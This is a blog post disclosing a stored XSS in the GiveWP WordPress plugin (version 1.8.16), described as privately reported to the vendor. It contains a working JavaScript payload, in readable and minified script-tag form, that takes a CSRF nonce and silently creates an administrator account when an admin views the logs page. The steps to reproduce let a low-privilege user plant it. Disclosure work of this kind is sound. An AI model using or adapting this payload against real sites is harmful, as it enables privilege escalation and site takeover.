---
layout: post
title:  "Vulnerability Report - WordPress plugin - givewp"
subtitle: "XSS to get admin!"
categories: security
tags: [ vulnerability  ]
---
This is a post I back dated to when I privately reported a vulnerability to givewp for their WordPress plugin. I privately shared via their support contact form. The version this XSS was found is long in the past!

> I discovered an XSS vulnerability, details included in Vulnerability input.
> If you have any questions or need more information please let me know! I wasn't sure how to do a 'private pull request' otherwise I would have done that.


## Problem
There is an Authenticated, Stored XSS that allows lower privileges users to craft an XSS payload in the form title that would enable them to create an administrator user they can login with. For the proof of concept, I created a user with the *Give Worker* role and created an admin user via the XSS.

## Problem source
I can't find the original version of the source code, but here is the reference.
https://github.com/WordImpress/Give/blob/release/1.8.17/includes/admin/tools/logs/class-sales-logs-list-table.php#L75Raw

## Steps to reproduce
- 1 - Add user with Give Worker role
- 2 - Login to that user account or switch to that user using User Switching plugin
- 3 - Add donation form at Give > Add Form (/wp-admin/post-new.php?post_type=give_forms)
- 4 - For form title use the minifiied title with script tags found here

```javascript
u5='/wp-admin/user-new.php'
u8= "same-origin"
fetch(u5,{credentials: u8}).then(function(r) {
  n={}
  fd=new FormData();
  // Create an admin user via XSS
  r.text().then(function(t){
    m = /_wpnonce_create-user" value="([^"]*?)"/.exec(t);
    n['_wpnonce_create-user'] = m[1]
    n.action = 'createuser';
    n.pass1='pass9999999999';
    n.pass2='pass9999999999';
    n.user_login='test4565465';
    n.email='waiting@email.com';
    n.role='administrator';
    n._wp_http_referer=u5;

    for (var k in n) {
      fd.append(k, n[k]);
    }

    fetch(u5, {
      method: 'post',
      body: fd,
      credentials:u8
    });
  });
});
```
**minified version**  
```javascript
// <script>u5="/wp-admin/user-new.php",u8="same-origin",fetch(u5,{credentials:u8}).then(function(e){n={},fd=new FormData,e.text().then(function(e){m=/_wpnonce_create-user" value="([^"]*?)"/.exec(e),n["_wpnonce_create-user"]=m[1],n.action="createuser",n.pass1="pass9999999999",n.pass2="pass9999999999",n.user_login="test4565465",n.email="waiting@email.com",n.role="administrator",n._wp_http_referer=u5;for(var t in n)fd.append(t,n[t]);fetch(u5,{method:"post",body:fd,credentials:u8})})});</script>
```

https://gist.github.com/rezen/df6d132e2336424e9b3668ed7c5947a5
- 5 - Switch to administrator user
- 6 - With an administrator account, go to Give > Tools > Logs (tab) (/wp-admin/edit.php?post_type=give_forms&page=give-tools&tab=logs)
- 7 - Go observe new user added Users > All Users (/wp-admin/users.php)

## Tested on
- WP Version: 4.8
- PHP Version: 5.6.30
- Plugin Version: 1.8.16
- Browser: Chrome 58